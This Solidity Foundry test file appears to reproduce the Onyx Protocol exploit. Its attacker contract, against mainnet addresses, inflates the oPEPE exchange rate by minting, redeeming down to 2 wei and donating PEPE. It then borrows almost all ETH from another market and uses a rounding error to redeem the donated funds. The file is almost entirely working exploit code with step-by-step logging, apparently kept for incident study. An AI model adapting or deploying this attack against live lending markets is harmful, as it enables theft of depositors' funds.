// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {ICERC20Delegator} from "./OnyxProtocol.attack.sol";
import {IcrETH} from "./OnyxProtocol.attack.sol";
import {IComptroller} from "./OnyxProtocol.attack.sol";

contract Attacker1Contracts is TokenBalanceTracker {
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    ICERC20Delegator private constant oPEPE =
        ICERC20Delegator(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
    IcrETH private constant oETHER = IcrETH(payable(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79));
    IComptroller private constant Unitroller = IComptroller(0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800);
    IWETH9 private constant WETH = IWETH9(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    constructor() {
        addTokenToTracker(address(WETH));
        addTokenToTracker(address(PEPE));
        updateBalanceTracker(address(this));
    }

    function start() external {
        // Approves the oPEPE contract to spend PEPE tokens on behalf of the contract
        console.log("------- STEP 3: Market Manipulation------");

        PEPE.approve(address(oPEPE), type(uint256).max);
        // Mints 1e18 oPEPE tokens (

        oPEPE.mint(1e18);
        // Redeems almost all oPEPE tokens, leaving only 2 wei of oPEPE tokens

        oPEPE.redeem(oPEPE.totalSupply() - 2);
        uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
        logBalancesWithLabel("Attacker1Contracts", address(this));

        console.log("------- STEP 4: Donate to oPEPE market ------");

        PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));

        address[] memory oTokens = new address[](1);
        oTokens[0] = address(oPEPE);
        Unitroller.enterMarkets(oTokens);
        logBalancesWithLabel("Attacker1Contracts", address(this));

        console.log("------- STEP 5: Borrow from other markets ------");
        oETHER.borrow(oETHER.getCash() - 1);

        logBalancesWithLabel("Attacker1Contracts", address(this));
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer ETH not successful");

        console.log("------- STEP 6: Exploit rounding error to redeem donated funds ------");
        oPEPE.redeemUnderlying(redeemAmt);
        (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
        (, uint256 numSeizeTokens) =
            Unitroller.liquidateCalculateSeizeTokens(address(oETHER), address(oPEPE), 1);
        uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;

        oPEPE.mint(mintAmount);
        logBalancesWithLabel("Attacker1Contracts", address(this));
        PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
    }

    receive() external payable {}
}
